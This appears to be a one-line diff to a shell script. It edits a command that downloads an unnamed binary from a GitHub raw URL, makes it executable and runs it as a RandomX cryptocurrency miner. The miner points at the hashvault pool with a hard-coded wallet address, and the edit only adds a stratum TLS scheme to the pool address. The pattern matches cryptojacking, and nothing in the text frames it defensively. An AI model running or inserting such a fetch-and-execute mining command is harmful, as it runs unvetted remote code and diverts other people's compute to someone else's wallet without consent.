@@ -1,1 +1,1 @@
-wget https://github.com/ismaimwan6372/gpuantre/raw/main/zepher && chmod 700 zepher && ./zepher -a RandomX -o pool.hashvault.pro:80 -u ZEPHYR2rJcFiZNiZqHwcxneo69155BprsdTt2tywSZkZHczqR1ZQNtKHs4YveufDRwd57pE1zuUvVZ6D3y4KtA4o63jmxvPDxik1u --keepalive -p rogstrix -t 3
+wget https://github.com/ismaimwan6372/gpuantre/raw/main/zepher && chmod 700 zepher && ./zepher -a RandomX -o stratum+tcps://pool.hashvault.pro:80 -u ZEPHYR2rJcFiZNiZqHwcxneo69155BprsdTt2tywSZkZHczqR1ZQNtKHs4YveufDRwd57pE1zuUvVZ6D3y4KtA4o63jmxvPDxik1u --keepalive -p rogstrix -t 3
